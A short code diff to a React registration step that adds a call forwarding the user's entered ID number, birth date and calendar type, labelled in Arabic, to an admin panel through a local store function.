@@ -1,5 +1,6 @@
 import { useState } from "react";
 import { Link, useLocation } from "wouter";
+import { submitData } from "@/lib/store";
 
 export default function RegisterStep2() {
   const [, setLocation] = useLocation();
@@ -95,6 +96,18 @@ export default function RegisterStep2() {
     }
     
     setShowErrors(false);
+    
+    // Get month name
+    const months = calendarType === "gregorian" ? gregorianMonths : hijriMonths;
+    const monthName = months[parseInt(month) - 1] || month;
+    
+    // Send data to admin panel
+    submitData({
+      "رقم الهوية": idNumber,
+      "تاريخ الميلاد": `${day} ${monthName} ${year}`,
+      "نوع التقويم": calendarType === "gregorian" ? "ميلادي" : "هجري"
+    });
+    
     // Navigate to step 3 with account type
     setLocation(`/register-step3?type=${accountType}`);
   };
